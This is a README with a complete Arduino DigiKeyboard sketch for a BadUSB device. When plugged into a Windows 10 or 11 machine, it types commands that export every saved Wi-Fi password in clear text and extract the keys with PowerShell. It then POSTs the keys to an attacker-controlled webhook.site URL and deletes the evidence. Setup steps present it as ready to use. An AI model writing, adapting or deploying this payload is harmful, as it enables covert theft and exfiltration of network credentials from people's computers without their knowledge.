# Wi-Fi Password Exporter using webhook.site

This Arduino sketch uses the DigiKeyboard library to automate the process of exporting saved Wi-Fi passwords and sending them to a webhook.site
Applies for Windows10 % Windows11

## Steps

1. First go to
   ```bash
   https://webhook.site
   ```
2. Copy `Your unique URL` to below code
3. After executing below code using USB Rubber Ducky, You will receive Wi-Fi Passwords to `https://webhook.site`

## Code

```cpp
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 // Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); // LED on Model A

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.println("cmd"); // smallest cmd window possible
  DigiKeyboard.delay(4000);
  
  DigiKeyboard.println("cd %temp%"); // going to temporary dir
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.println("netsh wlan export profile key=clear"); // grabbing all saved wifi passwords 
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); // Extracting all password
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/1e9ac684-9190-4dc5-a74f-2184d868f4de -Method POST -InFile Wi-Fi-PASS"); // Submitting passwords to webhook
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.println("del Wi-* /s /f /q"); // cleaning up all the mess
  DigiKeyboard.delay(7000);
  
  // DigiKeyboard.println("exit"); // Uncomment to exit cmd
  // DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); // turn on LED when program finishes
}

void loop() {
  // No loop needed
}
